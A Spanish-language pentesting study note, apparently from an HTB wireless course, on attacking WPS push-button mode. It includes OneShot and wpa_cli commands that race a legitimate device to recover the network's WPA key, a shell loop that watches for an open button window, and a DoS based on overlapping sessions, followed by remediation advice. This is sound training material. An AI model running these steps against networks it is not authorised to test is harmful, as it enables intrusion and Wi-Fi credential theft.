---
tags:
  - Wi-Fi/WPS
  - Pentesting/Explotacion
Descripción: "La ventana de dos minutos del botón WPS, cómo ganar la carrera a un dispositivo legítimo y por qué basta con esperar a que alguien lo pulse"
Fecha de actualización: 2026-08-01
Nota previa: "[[08 - Ejecución del ataque Pixie Dust]]"
Nota siguiente: "[[10 - DoS contra WPS con MDK4]]"
Area: "[[WPS.base|WPS]]"
---
---

`PBC` (*Push Button Configuration*) evita el PIN por completo: se pulsa un botón en el AP y otro en el cliente, y durante **unos dos minutos** el AP acepta a cualquiera que lo pida. <mark style="background: #ADCCFFA6;">No hay secreto que adivinar; la seguridad depende enteramente de que nadie más esté en alcance durante esa ventana</mark>.

# Identificar PBC

Con [[02 - Airodump-ng]], el modo aparece en la columna `WPS` junto a la versión — la lectura completa de esos acrónimos está en [[02 - Reconocimiento de WPS]]:

```shell-session
$ sudo airodump-ng wlan0mon -c 1 --wps

 BSSID              PWR Beacons  CH  ENC  CIPHER AUTH WPS                ESSID
 D8:D6:3D:EB:29:D5  -47      22   1  WPA2 CCMP   PSK  2.0 LAB,DISP,PBC,KPAD  HackTheWireless
```

O desde `wpa_cli` ([[06 - Conexión a redes Wi-Fi desde consola]]), sin modo monitor, donde la bandera `[WPS-PBC]` indica que la ventana está **abierta ahora mismo**:

```shell-session
$ wpa_cli scan_results
bssid              frequency  signal  flags                                 ssid
d8:d6:3d:eb:29:d5  2412       -49     [WPA2-PSK-CCMP][WPS-PBC][ESS]        HackTheWireless
```

<mark style="background: #FF5582A6;">Esa distinción es la clave del ataque</mark>: `PBC` en la lista de modos de `airodump-ng` significa "este AP soporta el botón". `[WPS-PBC]` en `wpa_cli` significa "el botón está pulsado y el AP está aceptando registros". Lo segundo es una ventana de oportunidad en curso.

# Con acceso físico

El escenario que plantea el módulo: estando en las oficinas del cliente, se pulsa el botón del router y se conecta.

```shell-session
$ wpa_cli wps_pbc D8:D6:3D:EB:29:D5
Selected interface 'wlan0'
OK
```

```shell-session
$ journalctl -u wpa_supplicant -f
wlan0: WPS-SUCCESS
wlan0: WPA: Key negotiation completed with d8:d6:3d:eb:29:d5 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to d8:d6:3d:eb:29:d5 completed
```

```shell-session
$ sudo dhcpcd wlan0
$ ip -brief addr show wlan0
wlan0    UP    192.168.1.23/24
```

Es un hallazgo perfectamente válido —**demuestra que el acceso físico al AP equivale a acceso a la red**, sin contraseña y sin dejar rastro de credenciales— y encaja en la parte de seguridad física del informe. Pero no es un ataque a distancia.

# La carrera del botón

El ataque real es aprovechar una ventana abierta por **otra persona**. Cuando alguien conecta una impresora, una cámara o un altavoz por WPS, el AP queda abierto durante dos minutos para cualquiera en alcance.

[[03 - OneShot y el estado del arte|`OneShot`]] automatiza la espera y el registro:

```shell-session
$ sudo python3 /opt/OneShot/oneshot.py -i wlan0 --pbc

[*] Starting WPS push button connection…
[*] Scanning…
[*] Selected AP: D8:D6:3D:EB:29:D5
[+] Associated with D8:D6:3D:EB:29:D5 (ESSID: HackTheWireless)
[*] Sending WPS Message M1…
[*] Received WPS Message M8
[+] WPS PIN: '<PBC mode>'
[+] WPA PSK: 'Contrasena-de-la-red'
[+] AP SSID: 'HackTheWireless'
```

<mark style="background: #FFB86CA6;">El resultado no es una sesión: es la `WPA-PSK` en claro</mark>, exactamente igual que con el ataque de PIN ([[03 - Fuerza bruta online del PIN]]). Con ella se conserva el acceso mucho después de que la ventana se cierre, y se puede descifrar retroactivamente el tráfico capturado con [[05 - Airdecap-ng]].

> [!important]+ La versión sigilosa: dejarlo escuchando
> En un engagement de varios días con presencia en el edificio, montar un vigilante del estado PBC cuesta nada y no transmite:
> ```shell-session
> $ while true; do
>     wpa_cli scan >/dev/null
>     wpa_cli scan_results | grep -q "WPS-PBC" && { echo "[!] Ventana PBC abierta"; break; }
>     sleep 20
>   done
> ```
> Cada vez que alguien conecte un dispositivo nuevo por WPS —lo que ocurre más de lo que parece en oficinas con impresoras y equipos de sala—, la ventana se abre. Es el ataque con mejor relación resultado/ruido de todo el módulo. Nótese que `wpa_cli scan` sí emite *probe requests*; para ser totalmente pasivo hay que leer el WPS IE de los beacons en modo monitor.

# Sesiones PBC solapadas

El estándar exige que, si el AP detecta **dos sesiones PBC simultáneas**, aborte ambas para evitar que alguien se cuele. Es una protección con dos caras:

- **Como defensa**, impide que el atacante se registre a la vez que el usuario legítimo.
- **Como ataque**, es una denegación de servicio trivial: iniciar sesiones PBC continuamente impide que **nadie** pueda usar el botón. <mark style="background: #8000E1A6;">Convierte una medida de seguridad en un vector de DoS</mark>.

En la práctica muchos firmwares no implementan la detección, y quien llegue primero gana.

> [!warning]+ El módulo no necesita modo monitor aquí
> HTB pone la interfaz en modo monitor con `airmon-ng` antes de lanzar OneShot con `--pbc`. **No hace falta y estorba**: OneShot opera a través de `wpa_supplicant`, que no funciona sobre una interfaz en modo monitor. Basta con liberar la interfaz de `NetworkManager`.

# Qué recomendar

PBC no tiene el fallo de diseño del PIN, pero sí tres problemas prácticos:

1. **Cualquiera en alcance durante la ventana obtiene la contraseña de la red**, no sólo acceso temporal.
2. **El alcance no coincide con las paredes.** Una ventana abierta en una planta baja es explotable desde la acera.
3. **Un botón físico accesible es una credencial física.** Un AP en un pasillo, una sala de reuniones o un armario sin llave es equivalente a la contraseña de la red pegada en la pared.

Recomendaciones, por orden:

- **Desactivar WPS por completo**, incluido PBC.
- Si tiene que quedarse, **ubicar los AP fuera del alcance de personas no autorizadas** y, donde el firmware lo permita, deshabilitar el botón físico.
- **Registrar y alertar** sobre los eventos `WPS-SUCCESS` del controlador: un registro WPS fuera de horario o desde un dispositivo desconocido es una señal clara.

Cuando el AP está bloqueado y ninguna de las vías anteriores funciona, queda forzar un reinicio — [[10 - DoS contra WPS con MDK4]].
